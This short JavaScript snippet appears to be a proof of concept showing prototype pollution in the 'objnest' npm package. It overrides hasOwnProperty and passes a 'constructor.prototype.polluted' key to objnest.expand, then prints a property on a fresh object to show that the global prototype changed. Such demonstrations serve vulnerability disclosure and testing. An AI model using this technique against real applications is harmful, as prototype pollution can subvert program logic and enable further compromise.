Object.prototype.hasOwnProperty = () => true;
const objnest = require('objnest');
let obj = {};
console.log({}.polluted);
objnest.expand({ 'constructor.prototype.polluted': 'yes' });
console.log({}.polluted);